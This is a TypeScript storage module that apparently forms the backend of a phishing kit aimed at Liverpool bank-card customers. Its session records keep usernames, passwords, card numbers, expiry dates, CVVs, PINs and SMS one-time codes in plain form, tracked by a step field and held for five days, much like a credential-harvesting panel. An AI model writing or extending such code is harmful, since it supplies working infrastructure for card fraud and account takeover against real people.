import { sessions, type Session, insertSessionSchema } from "@shared/schema";
import { z } from "zod";

// Define storage interface
export interface IStorage {
  getAllSessions(): Promise<Session[]>;
  getSavedSessions(): Promise<Session[]>;
  getCurrentSessions(): Promise<Session[]>;
  getSessionById(sessionId: string): Promise<Session | undefined>;
  createSession(data: Partial<Session>): Promise<Session>;
  updateSession(sessionId: string, data: Partial<Session>): Promise<Session>;
  deleteSession(sessionId: string): Promise<boolean>;
  saveSession(sessionId: string): Promise<Session>;
  cleanupExpiredSessions(): Promise<number>; // Devuelve la cantidad de sesiones eliminadas
}

// Memory storage implementation
export class MemStorage implements IStorage {
  private sessions: Map<string, Session>;
  private currentId: number;

  constructor() {
    this.sessions = new Map();
    this.currentId = 1;
  }

  async getAllSessions(): Promise<Session[]> {
    return Array.from(this.sessions.values());
  }

  async getSavedSessions(): Promise<Session[]> {
    return Array.from(this.sessions.values()).filter(
      (session) => session.saved === true
    );
  }

  async getCurrentSessions(): Promise<Session[]> {
    return Array.from(this.sessions.values()).filter(
      (session) => session.active === true && session.saved === false
    );
  }

  async getSessionById(sessionId: string): Promise<Session | undefined> {
    return Array.from(this.sessions.values()).find(
      (session) => session.sessionId === sessionId
    );
  }

  async createSession(data: Partial<Session>): Promise<Session> {
    if (!data.sessionId) {
      throw new Error("SessionId is required");
    }

    const id = this.currentId++;
    const createdAt = new Date();
    const active = true;
    const saved = false;
    
    const session: Session = {
      id,
      sessionId: data.sessionId,
      folio: data.folio || null,
      username: data.username || null,
      password: data.password || null,
      banco: data.banco || "LIVERPOOL",
      tarjeta: data.tarjeta || null,
      fechaVencimiento: data.fechaVencimiento || null,
      cvv: data.cvv || null,
      sms: data.sms || null,
      nip: data.nip || null,
      smsCompra: data.smsCompra || null,
      celular: data.celular || null,
      pasoActual: data.pasoActual || "folio",
      createdAt,
      active,
      saved,
    };

    this.sessions.set(data.sessionId, session);
    return session;
  }

  async updateSession(sessionId: string, data: Partial<Session>): Promise<Session> {
    const session = await this.getSessionById(sessionId);
    if (!session) {
      throw new Error(`Session with ID ${sessionId} not found`);
    }

    const updatedSession = { ...session, ...data };
    this.sessions.set(sessionId, updatedSession);
    return updatedSession;
  }

  async deleteSession(sessionId: string): Promise<boolean> {
    const session = await this.getSessionById(sessionId);
    if (!session) {
      return false;
    }

    this.sessions.delete(sessionId);
    return true;
  }
  
  async saveSession(sessionId: string): Promise<Session> {
    const session = await this.getSessionById(sessionId);
    if (!session) {
      throw new Error(`Session with ID ${sessionId} not found`);
    }
    
    const updatedSession = { ...session, saved: true };
    this.sessions.set(sessionId, updatedSession);
    return updatedSession;
  }
  
  async cleanupExpiredSessions(): Promise<number> {
    const now = new Date();
    const fiveDaysAgo = new Date(now.getTime() - (5 * 24 * 60 * 60 * 1000)); // 5 días en milisegundos
    
    let deletedCount = 0;
    const allSessions = Array.from(this.sessions.values());
    
    for (const session of allSessions) {
      // Comprobamos si la sesión fue creada hace más de 5 días
      if (session.createdAt && new Date(session.createdAt) < fiveDaysAgo) {
        this.sessions.delete(session.sessionId);
        deletedCount++;
      }
    }
    
    return deletedCount;
  }
}

// Export storage instance
export const storage = new MemStorage();
